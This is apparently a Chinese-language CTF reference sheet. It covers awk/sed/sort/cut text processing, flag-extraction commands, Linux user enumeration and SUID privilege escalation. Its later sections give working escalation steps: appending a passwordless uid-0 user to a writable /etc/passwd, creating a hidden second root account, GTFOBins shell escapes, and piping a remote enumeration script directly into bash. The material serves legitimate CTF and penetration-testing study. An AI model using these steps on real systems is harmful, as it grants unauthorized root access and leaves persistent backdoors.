## [g-text] 文本处理——awk/sed/sort/uniq/cut 组合拳

### [awk-sed] awk 与 sed 流处理 | medium | awk;sed;文本处理 | awk提取
> awk 按列拆分、按条件处理，sed 做替换与范围编辑；两者是日志分析、配置文件修改的主力。

#### 这个条目的作用

awk 按"列"处理文本，sed 按"行/模式"做替换，是日志分析、配置解析、批量改文件的标准工具。CTF 里最常见的三个需求都能用它们解决：从 /etc/passwd 抽用户、从日志里抽 IP/参数、批量替换配置里的关键字。

#### 前置条件

- 一个能执行命令的 shell（本地终端，或已拿到的 RCE / 反弹 shell）
- 目标文本可读：awk/sed 只是文本处理器，读不到的文件照样处理不了
- 记住默认行为：awk 默认按空白（空格/Tab）分列，分隔符不同时用 `-F` 指定；sed 默认只把处理结果输出到屏幕，改文件要加 `-i`

#### 第 1 步：awk 取列——`$1`/`$2`/`$NF`/`$0`

awk 把每行按分隔符拆成若干"列"，`$1` 第一列、`$2` 第二列、`$NF` 最后一列、`$0` 整行。

```bash
cat file | awk '{print $1}'      # 每行取第 1 列（默认按空格/Tab 分列）
awk '{print $NF}' file           # 每行最后一列
awk '{print $1, $3}' file        # 多列一起取，逗号之间是空格
```

预期结果：屏幕上逐行输出对应列。如果取的列明显不对（比如把整行当成一列），多半是分隔符不是空白，见第 2 步。

#### 第 2 步：指定分隔符 `-F` 与条件过滤

/etc/passwd 用冒号分隔，必须 `-F:`；还可用 `$3==0` 这类条件只处理匹配的行。

```bash
awk -F: '{print $1}' /etc/passwd          # 冒号分隔，取第 1 列（用户名）
awk -F: '$3==0{print $1}' /etc/passwd     # 条件：uid 为 0 的用户
awk -F: '$3>=1000 && $1!="nobody"{print $1, $3}' /etc/passwd   # 条件可叠加
awk '/root/{print $0}' file               # 只处理匹配正则的行
```

#### 第 3 步：行号 NR、范围与求和

```bash
awk '{print NR": "$0}' file         # NR 行号，$0 整行，输出"行号: 内容"
awk 'NR>=10 && NR<=20' file         # 只输出第 10-20 行
awk '{sum+=$1} END{print sum}' file # 累加第 1 列，END 在所有行处理完后执行
awk 'END{print NR}' file            # 统计总行数（相当于 wc -l）
```

#### 第 4 步：sed 打印范围与抽单行

```bash
sed -n '5,10p' file        # 打印第 5-10 行（-n 关闭默认输出，p 才打印）
sed -n '1p' file           # 只打印第 1 行
sed -n '3,5p' file         # 取一段再交给管道
```

#### 第 5 步：sed 替换 `s///g` 与 `-i` 写回

```bash
sed 's/old/new/g' file          # 把每行所有 old 换成 new（不加 -i 只预览）
sed -i 's/old/new/g' file       # -i 原地写回文件
sed -i.bak 's/old/new/g' file   # 写回前自动备份为 file.bak
sed 's/^/prefix/' file          # 行首插入
sed '/^#/d;/^$/d' file          # 删除注释行（^#）与空行（^$）
```

> [!warn] 永远先不带 `-i` 跑一遍确认结果，再决定要不要写回；`-i` 是原地改，错了没有后悔药（除非先 `-i.bak`）。

#### 第 6 步：sed 捕获组提取关键内容

`\(...\)` 是捕获组，`\1` 引用第 1 组；`-n` + `p` 组合实现"匹配到才打印"。

```bash
sed 's/flag{\(.*\)}/\1/' file                      # 提取 flag{} 里的内容
sed -n 's/.*key=\([^ &]*\).*/\1/p' file            # 抓一行中 key= 后面的值
sed -n 's/.*\([0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\).*/\1/p' file   # 抓 IP
```

#### 第 7 步：组合实战——解析 nginx 访问日志

```bash
# 日志行示例：127.0.0.1 - - [01/Jan/2025:10:00:00] "GET /flag HTTP/1.1" 200 123
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10   # 访问 IP 排行
awk -F'"' '{print $2}' access.log | head -5                          # 取引号内的请求行
sed -n 's/.*"\(GET\|POST\) \([^ ]*\).*/\1 \2/p' access.log | head    # 提取方法+路径
```

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|------|------|------|
| awk 取的列不对 | 分隔符不是空白 | 加 `-F:` 或 `-F,` 指定 |
| sed 替换后文件被改坏 | `-i` 直接写回且没备份 | 先不带 `-i` 预览，或 `-i.bak` |
| 捕获组只输出整行 | 忘了 `-n` 和结尾的 `p` | 写成 `sed -n 's/.../\1/p'` |
| awk 求和输出 0 | 列号错或该列不是数字 | 先 `awk '{print $N}'` 验证列内容 |
| 报语法错误 | shell 吃掉特殊字符 | 用单引号包住整个 awk/sed 脚本 |

#### 实战要点

- awk 速记：`$0` 整行、`$NF` 最后一列、`NR` 行号、`NF` 列数、`END{}` 收尾统计。
- awk 里引用 shell 变量用 `awk -v v="$var" '{print $v}'`，不要直接拼字符串。
- sed 三种常见形态：`sed -n 'A,Bp'`（范围打印）、`sed -n 's/.../.../p'`（匹配打印）、`sed -i 's/.../.../g'`（全局替换写回）。
- 分析日志先 `head` 看两行真实格式，再写 awk/sed，别盲猜列号。
- awk/sed 处理不了二进制：先用 `strings` 或 `tr '\0' '\n'` 转成文本。

### [sort-uniq-cut] 去重统计与列裁剪 | easy | sort;uniq;cut;tr | 去重
> sort+uniq 做排序去重统计，cut 按列裁剪，tr 做字符替换——日志 IP 统计、词频分析一条链搞定。

#### 这个条目的作用

sort 排序、uniq 去重计数、cut 按列裁剪、tr 做字符替换，四件套拼成 CTF 最高频的统计链路：日志 IP 排行、词频分析、按分隔符抽列、把被换行截断的 flag 拼回来。

#### 前置条件

- 能执行命令的 shell
- 记住 uniq 只能去"相邻重复"——必须先 sort，这是最常踩的坑
- cut 按"列"还是按"字符"要分清：`-d/-f` 是按分隔符的列，`-c` 是按字符

#### 第 1 步：sort 基础排序

```bash
sort file              # 按字典序排序
sort -n file           # 按数值排序（10 会排在 9 前面）
sort -r file           # 倒序
sort -nr file          # 数值倒序
sort -u file           # 排序并去重（一步到位）
```

#### 第 2 步：按指定列排序

```bash
sort -k2 file                # 按第 2 列字典序
sort -t: -k3 -n /etc/passwd  # 冒号分隔，按第 3 列（uid）数值排序
sort -t, -k2 -nr data.csv    # CSV 按第 2 列数值倒序
```

#### 第 3 步：uniq 去重（必须先 sort）

```bash
uniq file                # 相邻去重——不先 sort，相同行隔开就删不掉
sort file | uniq         # 正确姿势：排序后去重
sort file | uniq -d      # 只输出重复行
sort file | uniq -u      # 只输出只出现一次的行
```

#### 第 4 步：uniq -c 计数并排行

```bash
sort file | uniq -c                  # 去重并统计每行出现次数
sort file | uniq -c | sort -rn       # 按次数从高到低排列（统计标配）
sort file | uniq -c | sort -rn | head -10   # Top 10
```

#### 第 5 步：cut 按列/按字符裁剪

```bash
cut -d: -f1 /etc/passwd      # 冒号分隔，取第 1 列
cut -d: -f1,3 /etc/passwd    # 取第 1 和第 3 列
cut -d' ' -f2 file           # 空格分隔取第 2 列
cut -c1-5 file               # 取每行前 5 个字符
cut -c-10 file               # 每行前 10 个字符
cut -c6- file                # 每行第 6 个字符到结尾
```

> [!tip] 分隔是连续多个空格时 cut 会出错（它不压缩分隔符），这种情况改用 `awk '{print $N}'`。

#### 第 6 步：tr 字符替换/删除/压缩

```bash
tr 'a-z' 'A-Z' < file                  # 小写转大写
tr -d '\n' < file                      # 删除换行（把多行拼成一行）
tr -d ' \t\r\n' < file                 # 删除所有空白
tr -s ' ' < file                       # 压缩连续空格为 1 个
tr '\0' '\n' < /proc/self/environ      # 环境变量 NUL 分隔转行显示
tr ':' '\n' < file                     # 冒号换成换行（竖排）
```

#### 第 7 步：组合实战

```bash
# 1. 访问 IP 统计（日志第 1 列是 IP）
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head

# 2. 词频统计
tr -cs 'a-zA-Z' '\n' < file | sort | uniq -c | sort -rn | head -20

# 3. flag 被换行截断时拼回一行再提取
tr -d '\n' < flag.txt | grep -oE 'flag\{[^}]+\}'

# 4. 取第 3 行
head -3 file | tail -1
```

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|------|------|------|
| uniq 去重不干净 | 相同行不相邻 | 先 `sort` 再去重 |
| 排序 10 排在 2 前面 | 按字典序排了 | 加 `-n` 按数值 |
| 统计次数全是 1 | uniq -c 前没 sort | `sort \| uniq -c` |
| cut 取列错乱 | 多个连续空格 | 改用 `awk '{print $N}'` |
| tr -d '\n' 没效果 | 文件是 CRLF 换行 | 加 `tr -d '\r\n'` |

#### 实战要点

- 统计三连：`sort | uniq -c | sort -rn`，任何"出现次数排行"都这个套路。
- `sort -u` 一步去重但没计数；要计数必须 `uniq -c`。
- cut 处理单字符/定宽分隔可靠，复杂分隔一律 awk。
- `tr -d '\n'` 拼接后 grep flag，专治"flag 被换行切成两半"的题。
- `tr -s` 压缩空白、`tr -d` 删除字符、`tr 'x' 'y'` 替换，三种形态都要熟。

### [flag-extract] 提取 flag 的典型组合命令 | medium | flag;提取;正则;组合 | 抓flag
> 从日志、回显、源码、内存转储中把 flag 抽出来的套路命令集，可直接替换目标路径使用。

#### 这个条目的作用

拿到一段文本/一堆文件后，怎么最快把 flag 抠出来：标准格式正则、多前缀兼容、跨行拼接、二进制翻找、网络回显抓取、编码兜底，一条命令一个场景，直接替换路径就能用。

#### 前置条件

- 已经能读取目标内容（文件可读、RCE 回显、或 curl 能访问）
- 知道题目 flag 的大致格式（`flag{}` / `ctf{}` / `NSSCTF{}` 等）
- 记忆点：`grep -o` 只输出匹配部分本身，`-E` 扩展正则，`-r` 递归，`-h` 去掉文件名

#### 第 1 步：标准格式提取（单文件）

```bash
grep -oE 'flag\{[^}]+\}' file
grep -oE 'flag\{[^}]+\}' access.log | head   # 日志里抓
cat file | grep -oE 'flag\{[^}]+\}'          # 管道写法，兼容 cat 场景
```

预期结果：只输出匹配到的 flag 本体，没有整行噪音。`[^}]+` 表示"一个或多个非 } 字符"，即假设 flag 以 `}` 结尾且内部不含 `}`。

#### 第 2 步：多前缀兼容

不同平台前缀不同：flag / ctf / nssctf / NSSCTF / CISCN{ 等。

```bash
grep -oiE '(flag|ctf|nssctf|CISCN)\{[^}]+\}' file                  # -i 忽略大小写
grep -rohE '(flag|ctf|nssctf)\{[^}]+\}' /path 2>/dev/null          # 递归整个目录
grep -rohE '[A-Za-z0-9_]+flag\{[^}]+\}' /path 2>/dev/null          # flag 前有前缀（如 xxxflag{...}）
```

#### 第 3 步：跨行拼接（flag 被换行/标签截断）

flag 常被 HTML 标签、换行、空格切成碎片，先删掉所有空白再匹配：

```bash
tr -d '\n' < file | grep -oE 'flag\{[^}]+\}'
cat file | tr -d ' \t\r\n' | grep -oE 'flag\{.*\}'
```

> [!tip] 网页回显常见 `fl` `<br>` `ag{...}` 的碎块，`tr -d '\n'` 之后最好再加 `-d ' \t'` 连空格一起删。

#### 第 4 步：二进制/压缩流里翻

```bash
strings file | grep -iE 'flag|\{[a-zA-Z0-9_]+\}'    # 可执行文件/内存转储
grep -a 'flag' file                                  # -a 把二进制当文本搜
binwalk file                                         # 文件里嵌文件/压缩包，先拆再翻
strings /proc/*/environ 2>/dev/null | grep -i flag   # 进程环境变量
```

#### 第 5 步：网络回显里抓

```bash
curl -s http://target/api | grep -oE 'flag\{[^}]+\}'
for p in 1 2 3; do curl -s "http://target/list?page=$p"; done | grep -o 'flag{.*}'
curl -s "http://target/search?q=admin" | tr -d '\n' | grep -oE 'flag\{[^}]+\}'   # 带拼接
```

#### 第 6 步：编码兜底——搜出来是 base64/hex

flag 常常先被 base64 或 hex 编码，匹配不到就解码再看：

```bash
echo "ZmxhZ3t0ZXN0fQ==" | base64 -d
echo "666c61677b746573747d" | xxd -r -p
echo "ZmxhZ3t0ZXN0fQ==" | base64 -d | grep -oE 'flag\{[^}]+\}'   # 解码后再 grep
```

> [!tip] 识别编码：base64 是大小写字母+数字+`+/=`，长度是 4 的倍数；hex 全是 0-9a-f。`strings` 看到一堆这类字符就该解码。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|------|------|------|
| 什么都匹配不到 | 前缀不是 flag | 用第 2 步的多前缀正则 |
| 只匹配出半个 flag | flag 被换行/标签截断 | `tr -d '\n'` 拼接后再 grep |
| 匹配到一堆垃圾行 | 忘了 `-o` | 加 `-o` 只输出匹配部分 |
| 二进制文件报 binary file | grep 遇到非文本 | 加 `-a` 或先 `strings` |
| 解出来的不是 flag | 是 base64 或 hex 编码 | 先解码再 grep |

#### 实战要点

- 万能起步：`grep -rohE '(flag|ctf|nssctf)\{[^}]+\}' / 2>/dev/null`，一条命令扫全盘。
- `[^}]+` 假设 flag 不含 `}`；若 flag 有特殊字符，放宽成 `flag\{.{6,120}\}`。
- 回显被截断优先 `tr -d '\n'`；带颜色的回显加 `sed 's/\x1b\[[0-9;]*m//g'` 先剥色。
- 二进制场景先 `strings` 再 `grep -i`；内存/环境变量走 `/proc/*/environ`、`/proc/*/cmdline`。
- 网络抓取记得 `-s` 静默，多页用 for 循环拼接，一次抓完统一 grep。

## [g-users] 用户与权限——账号、uid 0、组与可写文件

### [user-su-sudo] 用户管理与提权入口 | easy | 用户;su;sudo;useradd | 切换用户
> useradd 建账号、su 切账号、sudo 借用 root 权限——sudo 配置不当是提权的头号入口，排查清单请见提权组。

#### 这个条目的作用

搞清楚"我是谁、能切到谁、能 sudo 做什么"，是拿到 shell 后的第一件事。useradd 建账号、su 切换用户、sudo 借用 root 权限；其中 `sudo -l` 是提权核心命令，输出里的每一行都可能是入口。

#### 前置条件

- 一个低权 shell（或本地普通用户终端）
- 有权限才执行的命令：useradd/usermod 通常需要 root，su 需要知道目标用户密码
- 记住发行版差异：Debian/Ubuntu 的 sudo 组叫 `sudo`，RHEL/CentOS 系叫 `wheel`

#### 第 1 步：身份三连——id / whoami / who

```bash
id               # uid/gid/所属组，最重要
whoami           # 当前用户名
who ; w          # 谁登录了、每个登录者的详情
groups           # 当前用户所属组（看是否在 sudo/wheel 里）
```

预期结果：`uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)`——若看到 `27(sudo)` 或 `10(wheel)`，说明你已在管理员组，直接 `sudo -l`。

#### 第 2 步：查看用户清单

```bash
cat /etc/passwd        # 全部用户，每行 7 个字段
ls -la /home/          # 各家目录（别人目录里可能留了密钥/脚本）
```

#### 第 3 步：useradd 建用户

```bash
useradd -m -s /bin/bash newuser    # -m 建家目录，-s 指定 shell
passwd newuser                     # 设置密码（会提示输入两次）
```

#### 第 4 步：usermod 加组（sudo 组）

```bash
usermod -aG sudo newuser     # Debian/Ubuntu：加入 sudo 组（-a 追加，别丢现有组）
usermod -aG wheel newuser    # RHEL/CentOS：加入 wheel 组
groupadd newgroup            # 创建新组
```

#### 第 5 步：su 切换用户

```bash
su - root        # 切到 root（- 加载完整环境，PATH 才是 root 的）
su user          # 切到普通用户
```

> [!warn] 忘加 `-` 时环境变量（尤其 PATH）仍是原用户的，可能引发 PATH 劫持类问题；切 root 一律 `su -`。

#### 第 6 步：sudo 查看与执行

```bash
sudo -l            # 看当前用户能免密执行什么（提权核心命令！）
sudo command       # 以 root 执行单条命令
sudo -u www command   # 以指定用户执行
cat /etc/sudoers   # sudo 规则（通常只有 root 能读）
```

预期结果：`sudo -l` 输出 `User xxx may run the following commands`，下面每一行 `(root) NOPASSWD: /usr/bin/find` 都是提权线索（利用方法见 g-priv 的 GTFO 表）。

#### 第 7 步：拿到低权 shell 的标准三连

```bash
id                 # 1. 看组：是否已在 sudo/wheel
sudo -l            # 2. 看免密 sudo 条目
ls -la /home/*/    # 3. 看别的用户目录里留了什么
```

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|------|------|------|
| useradd: Permission denied | 非 root 用户 | 先 sudo useradd 或切 root |
| su 一直密码错误 | 密码错/账号无 shell | 确认 passwd 设置过；建号用 `-s /bin/bash` |
| usermod 把组全丢了 | 没用 -a 直接 -G | 用 `-aG` 追加 |
| sudo 提示不在 sudoers | 不在 sudo 组 | 需要 root 执行 usermod -aG sudo |
| sudo -l 输出 Nothing | 真没权限 | 转去看 SUID/cron/可写文件（见 g-priv） |

#### 实战要点

- 拿到 shell 先 `id` + `sudo -l`，两行命令定方向：有 sudo 走 sudo，没有走 SUID/cron。
- `sudo -l` 里 `NOPASSWD` 最值钱；有 `(root) ALL` 就直接 `sudo -u root bash`。
- `su -` 和 `su` 区别在环境变量，审计/复现时用 `su -` 保证 PATH 正确。
- usermod 永远 `-aG` 追加，别用 `-G` 覆盖（会把用户踢出原有组）。
- 造持久化账号是常见考点：`useradd -u 0 -o -g 0 root2` 能造第二个 uid 0 用户（见 passwd-uid）。

### [passwd-uid] /etc/passwd、uid 0 与可写文件 | medium | passwd;uid;可写;shadow | 权限绕过
> /etc/passwd 是本地用户账本的钥匙：字段结构、uid 0 判断、可写文件查找，都是提权与持久化的根基。

#### 这个条目的作用

/etc/passwd 是本地用户账本：看懂 7 字段结构、找出 uid 0 用户、发现直接存明文口令的用户、定位当前用户可写的文件/目录——四条线索分别通向提权和持久化。

#### 前置条件

- 能读 /etc/passwd（所有用户可读）
- 知道 uid 0 = root 权限：内核只看 uid 判断特权，不看用户名
- /etc/shadow 通常只有 root 可读，普通用户读不到是正常的

#### 第 1 步：看懂 /etc/passwd 的 7 个字段

```txt
用户名:口令占位(x):uid:gid:备注:家目录:登录shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

第二栏为 `x` 表示口令存在 /etc/shadow；如果直接是哈希串、或为空，说明口令"明文"写在 passwd 里——可能是可破解的哈希，甚至是空口令。

#### 第 2 步：找出所有 uid 0 用户

```bash
awk -F: '$3==0{print "uid0:",$1}' /etc/passwd    # 通常只有 root
```

预期结果：正常系统只输出 root。若多出别的用户名（如 `root2`、`backup`），说明有人（或题目）造了第二个 root 账号——它的密码可能就是提权钥匙。

#### 第 3 步：找出直接存口令的用户

```bash
awk -F: '$2!="x" && $2!="" {print $1, $2}' /etc/passwd   # 口令直接写在 passwd 里
```

若某行第二栏是一串 `$6$...` 或 `$y$...` 哈希：说明口令不在 shadow 而在 passwd，复制出来交给 john/hashcat 爆破，或直接试空密码 `su 用户名`。

#### 第 4 步：shadow 里的哈希格式

```bash
head -1 /etc/shadow    # root 权限时看 root 哈希
getent shadow root     # 用 getent 读（同样需要 root）
```

```txt
# 哈希前缀标识算法
$1$ = MD5        $5$ = SHA-256      $6$ = SHA-512 (crypt)   $y$ = yescrypt
```

#### 第 5 步：找当前用户可写/可控的文件

```bash
find / -writable -type f 2>/dev/null | grep -vE '^/(proc|sys|dev|run|tmp)/'
find / -perm -o+w -type f 2>/dev/null | grep -vE '^/(proc|sys|dev|run|tmp)/'
find / -user $(id -u) -type f 2>/dev/null | grep -vE '^/(proc|sys|dev|run)/'
find / -group $(id -g) -type f 2>/dev/null | grep -vE '^/(proc|sys|dev|run)/'
ls -la /etc/crontab /etc/cron.d 2>/dev/null     # 可写的定时任务脚本
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|run|tmp|var/tmp)/'
```

#### 第 6 步：/etc/passwd 可写时的提权注入

若第 5 步发现 /etc/passwd 可写（属主是你或权限 666），直接追加一个 uid 0 用户：

```bash
echo 'hack:x:0:0:root:/root:/bin/bash' >> /etc/passwd   # 空口令 uid 0 用户
su hack                                                # 免密切过去
# 或带密码哈希（先算好）：
openssl passwd -6 -salt x P@ss123          # 生成 $6$ 哈希
echo 'hack:$6$...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

> [!danger] 只在题目环境做，别在真实机器上动 /etc/passwd；追加 uid 0 用户会留下持久后门且极易被发现。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|------|------|------|
| su hack 提示密码错误 | 追加的账号第二栏非空 | 第二栏留空或写 x 并同步 shadow（留空最简单） |
| 追加后 su 失败 | 用户行字段数不对 | 严格 7 字段，冒号一个不少 |
| awk 过滤不出 uid 0 | 条件写错 | `-F: '$3==0{print $1}'`，注意是 $3 不是 $2 |
| 找不到可写文件 | 排除目录太宽 | 先缩小到 /etc /opt /usr/local /var/www |
| shadow 读不到 | 权限不足 | 正常的，改走 passwd 直存口令/可写文件路线 |

#### 实战要点

- 判断口令位置：第二栏 `x` → shadow；`$6$`/`$y$` 哈希 → 直接在 passwd，可爆破可试空密码。
- uid 0 是唯一特权判据：`useradd -u 0 -o -g 0 root2` 造出的"第二个 root"和 root 完全等价。
- 可写文件攻击思路：把它当成"会被 root 执行的东西"——cron 脚本、/etc/profile.d/*.sh、systemd unit、SUID 二进制的依赖库。
- 查可写文件先排除 /proc /sys /dev /run /tmp，那里可写是常态、没有利用价值。
- /etc/shadow 的 root 哈希爆破是最后手段，先走 passwd 直存口令和可写文件两条便宜路线。

## [g-priv] 提权辅助速查——SUID、sudo、PATH 与 cron

### [suid-scan] SUID/SGID 与自动化枚举 | medium | suid;提权;linpeas | SUID扫描
> SUID 程序以属主（常为 root）身份执行，找到可被利用的 SUID 二进制就拿到一条提权路径；linpeas 把整个枚举自动化。

#### 这个条目的作用

SUID 程序执行时以"属主"身份运行，属主是 root 的 SUID 二进制等于给了你一个 root 权限的入口——前提是它本身能被利用（能弹 shell、读文件、写文件）。本条目讲怎么扫、怎么筛、怎么验证，以及如何用 linpeas 一键自动化。

#### 前置条件

- 一个低权 shell
- 记住权限位：`-perm -4000` = SUID，`-perm -2000` = SGID（`-perm -` 表示"包含这些位即可"）
- 扫出来的二进制要逐个对照 GTFOBins（https://gtfobins.github.io）确认利用方式

#### 第 1 步：全盘扫 SUID 文件

```bash
find / -perm -4000 -type f 2>/dev/null              # SUID：执行时以属主身份运行
```

预期结果：输出一串带路径的二进制，如 `/usr/bin/sudo`、`/usr/bin/passwd`、`/usr/bin/find`。若列表里有 find/vim/python3/bash 这类"能执行命令"的程序，优先级最高。

#### 第 2 步：扫 SGID 并列出详细信息

```bash
find / -perm -2000 -type f 2>/dev/null              # SGID：执行时以属组身份运行
find / -perm -4000 -o -perm -2000 2>/dev/null | xargs ls -la   # 两种一起列详细信息
```

`ls -la` 输出里权限位形如 `-rwsr-xr-x`（s 在属主位 = SUID）或 `-rwxr-sr-x`（s 在属组位 = SGID）。

#### 第 3 步：精确匹配 4755/6755

```bash
find / -perm -4755 -type f 2>/dev/null    # 精确 4755（rwxr-xr-x + SUID）
find / -perm -6755 -type f 2>/dev/null    # 6755（SUID+SGID）
find / -perm -u=s -type f 2>/dev/null     # 符号写法：属主执行位是 s
```

#### 第 4 步：筛选高价值二进制

```bash
ls -la /usr/bin/sudo /usr/bin/passwd /usr/bin/su /usr/bin/find /usr/bin/vim \
       /usr/bin/python3 /usr/bin/perl /usr/bin/gcc /usr/bin/base64 /usr/bin/cp 2>/dev/null
```

- 能弹 shell/执行命令：find、vim、python3、perl、ruby、awk、env——直接 GTFO。
- 能读/写文件：less、more、tee、cp、base64——读 flag 或覆盖文件。
- passwd/sudo/su 本身是 SUID 是系统正常现象，不是漏洞。

#### 第 5 步：linpeas 一键自动化枚举

```bash
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
bash /tmp/linpeas.sh            # 全量：SUID、sudo、cron、可写文件、内核版本
bash /tmp/linpeas.sh -s         # 超快模式，先看 SUID/PATH/cron
```

内网无外网时：本地下载后 scp/nc 传上去，或用 `wget -qO- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash` 这类轻量备选。

#### 第 6 步：验证利用

对照 GTFOBins 找该二进制的 `Shell` 一栏，例如：

```bash
find / -perm -4000 -type f 2>/dev/null | grep -E 'find|vim|python|perl'   # 命中后：
# find 的 GTFO：find . -exec /bin/sh -p \; -quit
# vim 的 GTFO：vim -c ':!/bin/sh'
# python 的 GTFO：python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

> [!warn] 弹出来的 sh 继承 SUID 的 euid 0，记得用 `/bin/sh -p`（-p 保留 euid）并确认 `id` 输出是 uid=0。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|------|------|------|
| 扫出很多但都是系统正常项 | passwd/sudo/su 本来就是 SUID | 只看"能执行命令/读写文件"的 |
| 利用后 id 还是普通用户 | shell 丢了 euid | 用 `/bin/sh -p` 或 os.setuid(0) 后再起 shell |
| find 权限位写法不对 | -perm 与 -perm - 混用 | `-perm -4000` 是"含 SUID 即可"，`-perm 4000` 是"恰好" |
| linpeas 下载失败 | 目标无外网 | 本地下载传上去；或手写枚举命令 |
| SUID 属主不是 root | 属主是普通用户 | 没价值，跳过 |

#### 实战要点

- 扫描一条龙：`find / -perm -4000 -type f 2>/dev/null` 先出名单，再逐个 `ls -la` 看属主与版本。
- 高价值判定：能执行命令（find/vim/python/perl/awk/env）＞能读写文件（tee/cp/base64）＞系统正常项（passwd/sudo/su）。
- SUID 的 bash 要 `bash -p` 才保留 euid 0；find 要 `-exec /bin/sh -p \; -quit` 才干净退出。
- 老版本二进制先查 CVE（如 CVE-2021-4034 polkit、CVE-2019-14287 sudo），版本用 `--version` 拿。
- linpeas 输出重点看 `SUID`、`sudo`、`Cron`、`Writable` 四段，红色 `[!]` 即高价值点；`--nocolor` 便于日志化。
- 内网无外网时把枚举命令攒成小脚本（find/crontab/sudo -l/writable）一次跑完，别依赖下载工具。
